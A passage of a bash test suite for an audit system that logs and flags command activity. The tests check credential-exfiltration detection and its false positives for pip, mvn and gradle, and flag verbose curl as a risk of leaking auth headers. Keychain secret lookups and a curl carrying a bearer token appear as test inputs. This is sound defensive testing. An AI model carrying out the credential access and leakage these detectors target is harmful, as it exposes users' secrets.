    audit_check_patterns "network_activity" "Bash" "pip install requests" "" "$((now + 5))" || true

    local exfil_found=false
    for f in "$TEST_AUDIT_DIR"/*-alerts.jsonl; do
        if [[ -f "$f" ]]; then
            if grep -q "credential_exfiltration" "$f" 2>/dev/null; then
                exfil_found=true
            fi
        fi
    done
    assert_true "[[ '$exfil_found' == 'false' ]]" "pip install should not trigger credential_exfiltration"

    teardown
}

# 26. maven/gradle not flagged as credential exfiltration
test_pattern_no_false_positive_maven() {
    log_test "mvn/gradle commands not flagged as credential exfiltration"

    setup
    source_audit
    source_audit_patterns

    local now
    now=$(date +%s)

    # Credential access event
    audit_check_patterns "credential_access" "keychain" "security find-generic-password" "" "$now" || true

    # mvn install should be excluded
    audit_check_patterns "network_activity" "Bash" "mvn clean install -q" "" "$((now + 3))" || true

    # Also test gradle
    audit_check_patterns "network_activity" "Bash" "gradle build" "" "$((now + 6))" || true

    local exfil_found=false
    for f in "$TEST_AUDIT_DIR"/*-alerts.jsonl; do
        if [[ -f "$f" ]]; then
            if grep -q "credential_exfiltration" "$f" 2>/dev/null; then
                exfil_found=true
            fi
        fi
    done
    assert_true "[[ '$exfil_found' == 'false' ]]" "mvn/gradle should not trigger credential_exfiltration"

    teardown
}

# 27. Verbose curl flagged as unusual command (Issue #246)
test_pattern_verbose_curl_detected() {
    log_test "curl -v / --verbose flagged as unusual command (auth header leak risk)"

    setup
    source_audit
    source_audit_patterns

    local now
    now=$(date +%s)

    # Test curl -v
    local alert_rc=0
    if audit_check_patterns "network_activity" "Bash" "curl -v https://api.github.com/user" "" "$now"; then
        alert_rc=0
    else
        alert_rc=1
    fi
    assert_equals 0 "$alert_rc" "curl -v should trigger unusual_commands alert"

    # Verify alert content
    local alert_found=false
    for f in "$TEST_AUDIT_DIR"/*-alerts.jsonl; do
        if [[ -f "$f" ]]; then
            if grep -q "verbose curl" "$f" 2>/dev/null; then
                alert_found=true
            fi
        fi
    done
    assert_true "[[ '$alert_found' == 'true' ]]" "Alert should mention 'verbose curl'"

    teardown
}

# 28. curl --verbose also detected (long flag form)
test_pattern_verbose_curl_long_flag() {
    log_test "curl --verbose also flagged"

    setup
    source_audit
    source_audit_patterns

    local now
    now=$(date +%s)

    local alert_rc=0
    if audit_check_patterns "network_activity" "Bash" "curl --verbose -H 'Authorization: Bearer token' https://api.github.com" "" "$now"; then
        alert_rc=0
    else
        alert_rc=1
    fi
    assert_equals 0 "$alert_rc" "curl --verbose should trigger unusual_commands alert"

    teardown
}

# 29. Combined short flags (curl -sv, curl -kv) also detected
test_pattern_verbose_curl_combined_flags() {
    log_test "curl -sv (combined flags with -v) also flagged"

    setup
    source_audit
    source_audit_patterns

    local now
    now=$(date +%s)

    local alert_rc=0
    if audit_check_patterns "network_activity" "Bash" "curl -sv https://api.github.com/user" "" "$now"; then
        alert_rc=0
    else
        alert_rc=1
    fi
    assert_equals 0 "$alert_rc" "curl -sv should trigger unusual_commands alert"

    teardown
}

# 30. Normal curl (no -v) should NOT be flagged
test_pattern_normal_curl_not_flagged() {
    log_test "Normal curl (no -v) not flagged as unusual"

    setup
    source_audit
    source_audit_patterns

    local now
    now=$(date +%s)

    audit_check_patterns "network_activity" "Bash" "curl -s https://api.github.com/repos" "" "$now" || true

    local unusual_found=false
    for f in "$TEST_AUDIT_DIR"/*-alerts.jsonl; do
        if [[ -f "$f" ]]; then
            if grep -q "verbose curl" "$f" 2>/dev/null; then
                unusual_found=true
            fi
        fi
    done
    assert_true "[[ '$unusual_found' == 'false' ]]" "Normal curl should not trigger verbose curl alert"

    teardown
}

#===============================================================================
# TEST RUNNER
#===============================================================================

main() {
    print_test_header "Audit System (audit.sh, audit-patterns.sh, audit-report.sh)"

    # Core tests (1-11)
    run_test test_audit_init_creates_file
    run_test test_audit_log_event_appends
    run_test test_audit_hash_chain_valid
    run_test test_audit_hash_chain_broken
    run_test test_audit_classify_credential_access
    run_test test_audit_classify_network_activity
    run_test test_audit_classify_filesystem_op
    run_test test_audit_classify_git_op
    run_test test_audit_secret_sanitization
    run_test test_audit_can_be_disabled
    run_test test_audit_file_rotation

    # Pattern detection tests (12-15)
    run_test test_pattern_credential_exfiltration
    run_test test_pattern_mass_deletion
    run_test test_pattern_sensitive_path
    run_test test_pattern_no_false_positive_npm

    # Report tests (16-17)
    run_test test_report_text_format
    run_test test_report_verify_chain

    # K8s backend tests (18-19)
    run_test test_k8s_cr_includes_audit_env
    run_test test_k8s_cr_excludes_audit_env

    # Report format tests (20-22)
    run_test test_report_json_format
    run_test test_report_alerts_only_text
    run_test test_report_alerts_only_json

    # Cleanup tests (23-24)
    run_test test_audit_cleanup_ttl
    run_test test_audit_cleanup_size_cap

    # Additional false positive tests (25-26)
    run_test test_pattern_no_false_positive_pip
    run_test test_pattern_no_false_positive_maven

    # Verbose curl detection tests (27-30, Issue #246)
    run_test test_pattern_verbose_curl_detected
    run_test test_pattern_verbose_curl_long_flag
    run_test test_pattern_verbose_curl_combined_flags
    run_test test_pattern_normal_curl_not_flagged

    print_summary
    return "$TESTS_FAILED"
}

main "$@"
